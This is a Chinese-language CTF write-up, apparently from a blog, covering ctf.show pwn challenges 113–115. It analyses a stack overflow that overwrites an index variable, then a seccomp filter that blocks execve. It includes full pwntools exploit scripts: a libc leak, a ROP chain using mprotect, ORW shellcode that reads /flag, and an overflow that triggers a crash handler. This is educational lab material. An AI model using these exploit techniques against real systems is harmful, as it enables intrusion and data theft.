+<p>前边都好说，logo啊什么的，在fwrite向_bss_start写入&gt;&gt;之后立刻fflush刷新了输出缓冲区，前边都没有啥</p>
+<p>重点在于这里</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs markdown">v8 = 0LL;<br>while ( !feof(stdin) )<br>&#123;<br>  v7 = fgetc(stdin);<br>  if ( v7 == 10 )<br><span class="hljs-code">    break;</span><br><span class="hljs-code">  v3 = v8++;</span><br><span class="hljs-code">  v6 = v3;</span><br><span class="hljs-code">  v5[v3] = v7;</span><br><span class="hljs-code">&#125;</span><br><span class="hljs-code">v5[v8] = 0;</span><br></code></pre></td></tr></table></figure>
+
+<p>每次读一个字符，只要不是换行符都不会跳出循环，用v8作为下标写入v5数组，然后v8++</p>
+<p>这个循环没有任何的长度检查，所以可以拿来构造栈溢出</p>
+<p>但多少才会栈溢出呢，这是目前主要的一个问题</p>
+<p>先搞明白栈结构</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">sub     rsp, 420h<br></code></pre></td></tr></table></figure>
+
+<p>可以看到，main栈帧如上</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-strong">__int64 v3; // rax</span><br><span class="hljs-strong">char v5[1032]; // [rsp+0h] [rbp-420h] BYREF</span><br><span class="hljs-strong">__</span>int64 v6; // [rsp+408h] [rbp-18h]<br>char v7; // [rsp+417h] [rbp-9h]<br><span class="hljs-strong">__int64 v8; // [rsp+418h] [rbp-8h]</span><br></code></pre></td></tr></table></figure>
+
+<p>而这是局部变量的分布</p>
+<p>因此栈布局大概是这样子的</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs markdown">低地址<br>[rbp-0x420]  v5 缓冲区开始<br>...<br>[rbp-0x18]   v6<br>[rbp-0x10]   padding<br>[rbp-0x9]    v7<br>[rbp-0x8]    v8<br>[rbp+0x0]    saved rbp<br>[rbp+0x8]    return address<br>高地址<br></code></pre></td></tr></table></figure>
+
+<p>我们写入的在v5，索引在v8</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">(rbp-0x8) - (rbp-0x420) = 0x418<br></code></pre></td></tr></table></figure>
+
+<p>也就是说我们在输入第0x418个字节的时候，输入的东西会碰到v8</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">(rbp+0x8) - (rbp-0x420) = 0x428<br></code></pre></td></tr></table></figure>
+
+<p>同理继续往下写的话写到0x428就是saved RIP的地址</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774879244101-f16c5a15-8474-4a9c-b7cc-db9a504811bd.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们看汇编可以看到这边的逻辑</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">rax = v8<br>v8 = v8 + 1<br>v6 = old v8<br>buf + old v8<br>最后写入当前字符<br></code></pre></td></tr></table></figure>
+
+<p>所以我们要先取old v8，然后再把这个v8自增，再用old v8作为写入的位置</p>
+<p>可以想到，当我写入第0x418个字节的时候</p>
+<p>old v8 &#x3D; 0x418</p>
+<p>然后这个时候处理第0x419个字节</p>
+<p>会先把v8+1，变成0x419，之后再把这个字节写到v5[0x418]去</p>
+<p>而我们刚刚算过，这个v5[0x418]就是v8的最低字节啊</p>
+<p>如果这个时候我们写入的是0x28这个字节的话</p>
+<p>我们的v8就从0x419直接变成了0x428</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">0x0000000000000419 --&gt; 0x0000000000000428<br></code></pre></td></tr></table></figure>
+
+<p>于是下一次写入就到了0x428，而这是saved RIP的偏移，所以直接就写到返回地址上了，不会一路给这个栈全创飞</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs markdown">if ( (unsigned int)init(v5) )<br>&#123;<br>  qsort(files, size<span class="hljs-emphasis">_of_</span>path, 0x200uLL, cmp);<br>  search<span class="hljs-emphasis">_file_</span>info();<br>&#125;<br>else<br>&#123;<br>  fflush(<span class="hljs-emphasis">_bss_</span>start);<br>  set<span class="hljs-emphasis">_secommp();</span><br><span class="hljs-emphasis">&#125;</span><br><span class="hljs-emphasis">return 0;</span><br></code></pre></td></tr></table></figure>
+
+<p>之后就是main的后半段了</p>
+<p>这边是两个分支</p>
+<p>一个是init成功了，即输入的是普通文件的话就把文件名和路径存到files，返回1</p>
+<p>如果是目录就遍历目录放到files然后返回1</p>
+<p>另一个是init失败了，输入路径不存在，那就报0</p>
+<p>而我们刚刚的payload明显不是个路径啊，所以走的是失败的这条路，也就是在返回前先set_secommp（）</p>
+<p>来好好看看这个函数</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs markdown">int set<span class="hljs-emphasis">_secommp()</span><br><span class="hljs-emphasis">&#123;</span><br><span class="hljs-emphasis">  <span class="hljs-strong">__int16 v1; // [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  __</span>int16 *v2; // [rsp+8h] [rbp-48h]</span><br><span class="hljs-emphasis">  <span class="hljs-strong">__int16 v3; // [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  char v4; // [rsp+12h] [rbp-3Eh]</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  char v5; // [rsp+13h] [rbp-3Dh]</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  int v6; // [rsp+14h] [rbp-3Ch]</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  __</span>int16 v7; // [rsp+18h] [rbp-38h]</span><br><span class="hljs-emphasis">  char v8; // [rsp+1Ah] [rbp-36h]</span><br><span class="hljs-emphasis">  char v9; // [rsp+1Bh] [rbp-35h]</span><br><span class="hljs-emphasis">  int v10; // [rsp+1Ch] [rbp-34h]</span><br><span class="hljs-emphasis">  <span class="hljs-strong">__int16 v11; // [rsp+20h] [rbp-30h]</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  char v12; // [rsp+22h] [rbp-2Eh]</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  char v13; // [rsp+23h] [rbp-2Dh]</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  int v14; // [rsp+24h] [rbp-2Ch]</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  __</span>int16 v15; // [rsp+28h] [rbp-28h]</span><br><span class="hljs-emphasis">  char v16; // [rsp+2Ah] [rbp-26h]</span><br><span class="hljs-emphasis">  char v17; // [rsp+2Bh] [rbp-25h]</span><br><span class="hljs-emphasis">  int v18; // [rsp+2Ch] [rbp-24h]</span><br><span class="hljs-emphasis">  <span class="hljs-strong">__int16 v19; // [rsp+30h] [rbp-20h]</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  char v20; // [rsp+32h] [rbp-1Eh]</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  char v21; // [rsp+33h] [rbp-1Dh]</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  int v22; // [rsp+34h] [rbp-1Ch]</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  __</span>int16 v23; // [rsp+38h] [rbp-18h]</span><br><span class="hljs-emphasis">  char v24; // [rsp+3Ah] [rbp-16h]</span><br><span class="hljs-emphasis">  char v25; // [rsp+3Bh] [rbp-15h]</span><br><span class="hljs-emphasis">  int v26; // [rsp+3Ch] [rbp-14h]</span><br><span class="hljs-emphasis">  <span class="hljs-strong">__int16 v27; // [rsp+40h] [rbp-10h]</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  char v28; // [rsp+42h] [rbp-Eh]</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  char v29; // [rsp+43h] [rbp-Dh]</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  int v30; // [rsp+44h] [rbp-Ch]</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  __</span>int16 v31; // [rsp+48h] [rbp-8h]</span><br><span class="hljs-emphasis">  char v32; // [rsp+4Ah] [rbp-6h]</span><br><span class="hljs-emphasis">  char v33; // [rsp+4Bh] [rbp-5h]</span><br><span class="hljs-emphasis">  int v34; // [rsp+4Ch] [rbp-4h]</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">  prctl(38, 1LL, 0LL, 0LL, 0LL);</span><br><span class="hljs-emphasis">  v3 = 32;</span><br><span class="hljs-emphasis">  v4 = 0;</span><br><span class="hljs-emphasis">  v5 = 0;</span><br><span class="hljs-emphasis">  v6 = 4;</span><br><span class="hljs-emphasis">  v7 = 21;</span><br><span class="hljs-emphasis">  v8 = 0;</span><br><span class="hljs-emphasis">  v9 = 5;</span><br><span class="hljs-emphasis">  v10 = -1073741762;</span><br><span class="hljs-emphasis">  v11 = 32;</span><br><span class="hljs-emphasis">  v12 = 0;</span><br><span class="hljs-emphasis">  v13 = 0;</span><br><span class="hljs-emphasis">  v14 = 0;</span><br><span class="hljs-emphasis">  v15 = 53;</span><br><span class="hljs-emphasis">  v16 = 0;</span><br><span class="hljs-emphasis">  v17 = 1;</span><br><span class="hljs-emphasis">  v18 = 0x40000000;</span><br><span class="hljs-emphasis">  v19 = 21;</span><br><span class="hljs-emphasis">  v20 = 0;</span><br><span class="hljs-emphasis">  v21 = 2;</span><br><span class="hljs-emphasis">  v22 = -1;</span><br><span class="hljs-emphasis">  v23 = 21;</span><br><span class="hljs-emphasis">  v24 = 1;</span><br><span class="hljs-emphasis">  v25 = 0;</span><br><span class="hljs-emphasis">  v26 = 59;</span><br><span class="hljs-emphasis">  v27 = 6;</span><br><span class="hljs-emphasis">  v28 = 0;</span><br><span class="hljs-emphasis">  v29 = 0;</span><br><span class="hljs-emphasis">  v30 = 2147418112;</span><br><span class="hljs-emphasis">  v31 = 6;</span><br><span class="hljs-emphasis">  v32 = 0;</span><br><span class="hljs-emphasis">  v33 = 0;</span><br><span class="hljs-emphasis">  v34 = 0;</span><br><span class="hljs-emphasis">  v1 = 8;</span><br><span class="hljs-emphasis">  v2 = &amp;v3;</span><br><span class="hljs-emphasis">  return prctl(22, 2LL, &amp;v1);</span><br><span class="hljs-emphasis">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>可以发现这是个过滤器，先回检查体系是不是x86_64的</p>
+<p>然后检查syscall number，核心只拦了一个syscall–&gt;59&#x3D;execve</p>
+<p>所以我们不能用execve，而system也会走到这个execve</p>
+<p>所以不能用system，我们只能直接ORW读&#x2F;flag</p>
+<p>ROP链上来先利用栈溢出，通过puts函数泄露地址最后泄露libc</p>
+<p>之后就能求到libc基址了</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">puts<span class="hljs-emphasis">_addr = u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))</span><br><span class="hljs-emphasis">libc = LibcSearcher(&quot;puts&quot;,puts_</span>addr)<br>libc<span class="hljs-emphasis">_base = puts_</span>addr-libc.dump(&#x27;puts&#x27;)<br>mprotect<span class="hljs-emphasis">_addr = libc_</span>base+libc.dump(&quot;mprotect&quot;)<br>gets<span class="hljs-emphasis">_addr = libc_</span>base+libc.dump(&quot;gets&quot;)<br></code></pre></td></tr></table></figure>
+
+<p>因为mprotect函数需要三个参数所以我们要走rdi、rsi和rdx三个寄存器</p>
+<p>第二阶段就是利用mprotect来把.bss这个段变成可执行的</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">payload = b&quot;A&quot;<span class="hljs-emphasis">*0x418+p8(0x28)+p64(pop_rdi_ret)+ p64(data)</span><br><span class="hljs-emphasis">payload += p64(gets_addr)+p64(pop_rdi_ret)+p64(data)</span><br><span class="hljs-emphasis">payload += p64(pop_rsi)+p64(0x1000)+p64(pop_rdx)</span><br><span class="hljs-emphasis">payload += p64(7)+p64(mprotect_addr)+ p64(data)</span><br></code></pre></td></tr></table></figure>
+
+<p>其实是先gets(data)，然后mprotect(data,0x1000,7)</p>
+<p>最后跳到data，作为返回地址跳到0x603000</p>
+<p>为了最后绕过seccomp，我们最后用这个，不用碰execve</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">getflag = asm(shellcraft.cat(&quot;/flag&quot;))<br>io.sendline(getflag)<br></code></pre></td></tr></table></figure>
+
+<p>写得exp</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs markdown">from pwn import *<br>from LibcSearcher import *<br><br>context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log<span class="hljs-emphasis">_level=&#x27;debug&#x27;)</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">io = remote(&quot;pwn.challenge.ctf.show&quot;, 28271)</span><br><span class="hljs-emphasis">elf = ELF(&#x27;./pwn113&#x27;)</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis"># binary gadgets / symbols</span><br><span class="hljs-emphasis">pop_</span>rdi<span class="hljs-emphasis">_ret = 0x401ba3           # misaligned gadget from <span class="hljs-strong">__libc_csu_init</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">puts_plt    = 0x400BD0</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">puts_got    = elf.got[&#x27;puts&#x27;]</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">main_addr   = elf.sym[&#x27;main&#x27;]</span></span><br><span class="hljs-strong"><span class="hljs-emphasis"></span></span><br><span class="hljs-strong"><span class="hljs-emphasis"># page-aligned writable address for shellcode</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">data = 0x603000</span></span><br><span class="hljs-strong"><span class="hljs-emphasis"></span></span><br><span class="hljs-strong"><span class="hljs-emphasis"># --------------------------</span></span><br><span class="hljs-strong"><span class="hljs-emphasis"># stage 1: leak puts@libc</span></span><br><span class="hljs-strong"><span class="hljs-emphasis"># --------------------------</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">io.recvuntil(b&#x27;&gt;&gt; &#x27;)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis"></span></span><br><span class="hljs-strong"><span class="hljs-emphasis">payload  = b&#x27;A&#x27; * 0x418</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">payload += p8(0x28)              # overwrite low byte of v8: 0x419 -&gt; 0x428</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">payload += p64(pop_rdi_ret)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">payload += p64(puts_got)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">payload += p64(puts_plt)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">payload += p64(main_addr)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis"></span></span><br><span class="hljs-strong"><span class="hljs-emphasis">io.sendline(payload)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis"></span></span><br><span class="hljs-strong"><span class="hljs-emphasis">puts_addr = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">log.success(f&quot;puts_addr = &#123;hex(puts_addr)&#125;&quot;)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis"></span></span><br><span class="hljs-strong"><span class="hljs-emphasis">libc = LibcSearcher(&quot;puts&quot;, puts_addr)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">libc_base = puts_addr - libc.dump(&quot;puts&quot;)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">gets_addr = libc_base + libc.dump(&quot;gets&quot;)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">mprotect_addr = libc_base + libc.dump(&quot;mprotect&quot;)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis"></span></span><br><span class="hljs-strong"><span class="hljs-emphasis"># gadgets in matched libc</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">pop_rdx_ret = libc_base + 0x1b96</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">pop_rsi_ret = libc_base + 0x23e6a</span></span><br><span class="hljs-strong"><span class="hljs-emphasis"></span></span><br><span class="hljs-strong"><span class="hljs-emphasis">log.success(f&quot;libc_base = &#123;hex(libc_base)&#125;&quot;)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">log.success(f&quot;gets      = &#123;hex(gets_addr)&#125;&quot;)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">log.success(f&quot;mprotect  = &#123;hex(mprotect_addr)&#125;&quot;)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis"></span></span><br><span class="hljs-strong"><span class="hljs-emphasis"># --------------------------</span></span><br><span class="hljs-strong"><span class="hljs-emphasis"># stage 2: gets(data); mprotect(data,0x1000,7); jump data</span></span><br><span class="hljs-strong"><span class="hljs-emphasis"># --------------------------</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">io.recvuntil(b&#x27;&gt;&gt; &#x27;)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis"></span></span><br><span class="hljs-strong"><span class="hljs-emphasis">payload  = b&#x27;A&#x27; * 0x418</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">payload += p8(0x28)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">payload += p64(pop_rdi_ret)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">payload += p64(data)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">payload += p64(gets_addr)        # gets(data)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis"></span></span><br><span class="hljs-strong"><span class="hljs-emphasis">payload += p64(pop_rdi_ret)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">payload += p64(data)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">payload += p64(pop_rsi_ret)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">payload += p64(0x1000)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">payload += p64(pop_rdx_ret)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">payload += p64(7)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">payload += p64(mprotect_addr)    # mprotect(data, 0x1000, 7)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis"></span></span><br><span class="hljs-strong"><span class="hljs-emphasis">payload += p64(data)             # jump to shellcode</span></span><br><span class="hljs-strong"><span class="hljs-emphasis"></span></span><br><span class="hljs-strong"><span class="hljs-emphasis">io.sendline(payload)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis"></span></span><br><span class="hljs-strong"><span class="hljs-emphasis"># ORW shellcode: open/read/write /flag</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">sc = asm(shellcraft.cat(&quot;/flag&quot;))</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">io.sendline(sc)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis"></span></span><br><span class="hljs-strong"><span class="hljs-emphasis">io.interactive()</span></span><br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774972216807-cc9e0650-4f2c-4676-9ca8-e17a59264e76.png" srcset="/img/loading.gif" lazyload></p>
+<p>直接就读出来了</p>
+<h2 id="pwn114"><a href="#pwn114" class="headerlink" title="pwn114"></a>pwn114</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1774972261044-e6824d00-85df-4ccd-89df-087f9bcabd70.png" srcset="/img/loading.gif" lazyload></p>
+<p>现在我应该学会了…吗？</p>
+<p>大概就是bypass旁路绕过一些保护的意思吧，我们来看看这一题</p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775013995238-3be916a6-ae94-4244-9557-5e1f5a793d0a.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护是开了不少，怪唬人的，按题目意思是可以绕过</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775014059663-6f461496-53f0-4188-a4b9-40f231dd63d9.png" srcset="/img/loading.gif" lazyload></p>
+<p>定位main函数，这边有一个flagishere函数</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775014107945-ecd6a8e2-52b1-4672-971e-1ffd6520d4d2.png" srcset="/img/loading.gif" lazyload></p>
+<p>也就是说一开始就把flag读好了，但是呢不输出存起来了，继续回到main函数</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775014619735-8d9110cb-4d85-4356-90e4-5fa09f3029a4.png" srcset="/img/loading.gif" lazyload></p>
+<p>之后是这个signal函数，这是一个崩溃处理函数</p>
+<p>就是说如果我们发生了SIGSEGV段错误，就会执行这个sigsegv_handler函数</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775014687377-b08c0f3f-9c30-4db3-b1f7-570c667f2cd6.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以只要段错误就直接读flag了</p>
+<p>main函数里边就是问你会不会绕过Canary，不会就结束，必须选择会</p>
+<p>会了之后fgets开始读取输入字符了，最多读999字节(留一个给\0</p>
+<p>读取的内容会存到s</p>
+<p>而打开ctfshow函数</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775014351130-f12e1b1f-d81e-4ad6-a339-54e5bb3e823e.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775014356805-17399b34-f4a5-4d4e-ad53-c1183da649bb.png" srcset="/img/loading.gif" lazyload></p>
+<p>会发现ctfshow这个函数会把接收到的参数复制到dest，而dest只能读0x100+8个字节，随后即溢出</p>
+<p>所以很容易构成栈溢出，一开始选择Yes之后写100个字节就自动溢出了，那就段错误了，就直接被signal发现跳flag出来了</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs markdown">from pwn import *<br>context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log<span class="hljs-emphasis">_level=&#x27;debug&#x27;)</span><br><span class="hljs-emphasis">io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28121)</span><br><span class="hljs-emphasis">io.sendlineafter(&#x27;: \n&#x27;,&#x27;Yes&#x27;)</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">offset = 0x100+8</span><br><span class="hljs-emphasis">payload = b&#x27;a&#x27;*offset</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">io.sendlineafter(&#x27;Tell me you want: \n&#x27;,payload)</span><br><span class="hljs-emphasis">io.interactive()</span><br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775014970445-21d020ea-b7eb-46ed-9794-1d5a43565a2e.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到flag</p>
+<h2 id="pwn115"><a href="#pwn115" class="headerlink" title="pwn115"></a>pwn115</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775014996120-061b3ba8-eff7-4d6d-b1d7-888193560406.png" srcset="/img/loading.gif" lazyload></p>
+<p>OK开始学Bypass的一些姿势了，先看保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775015052229-54535400-8d1b-45f0-9e28-e279191a75e4.png" srcset="/img/loading.gif" lazyload></p>
+<p>只开了一个Canary和NX</p>
+<p>主要应该就是绕过这个Canary构造栈溢出然后打，我们看看main函数</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775018904178-beccfc88-ce22-4b59-bfbb-6dd7d2337b86.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
